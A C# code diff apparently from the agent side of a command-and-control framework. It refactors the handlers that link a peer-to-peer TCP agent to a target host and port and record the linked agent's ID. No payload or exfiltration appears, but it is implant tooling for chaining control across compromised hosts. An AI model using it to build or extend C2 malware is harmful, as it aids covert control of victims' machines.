@@ -5,10 +5,7 @@ using Agent.Models;
 
 using Shared.Models;
 
-using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
 
 namespace Agent.Modules
 {
@@ -44,23 +41,20 @@ namespace Agent.Modules
             };
         }
 
-        void LinkTCPAgent(string AgentID, C2Data C2Data)
+        void LinkTCPAgent(string AgentID, AgentTask Task)
         {
-            var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-
-            var target = (string)parameters.FirstOrDefault(p => p.Name.Equals("Target", StringComparison.OrdinalIgnoreCase)).Value;
-            var port = (int)parameters.FirstOrDefault(p => p.Name.Equals("Port", StringComparison.OrdinalIgnoreCase)).Value;
+            var target = (string)Task.Parameters["Target"];
+            var port = (int)Task.Parameters["Port"];
 
             var commModule = new TCPCommModule(target, port);
+            
             Agent.AddP2PAgent(commModule);
         }
 
-        void Link0Response(string AgentID, C2Data C2Data)
+        void Link0Response(string AgentID, AgentTask Task)
         {
-            var link0ResponseData = Encoding.UTF8.GetString(C2Data.Data);
-
-            var placeholder = link0ResponseData.Substring(0, 6);
-            var agentID = link0ResponseData.Substring(6, 6);
+            var placeholder = (string)Task.Parameters["Placeholder"];
+            var agentID = (string)Task.Parameters["AgentID"];
 
             Agent.UpdateP2PPlaceholder(placeholder, agentID);
         }
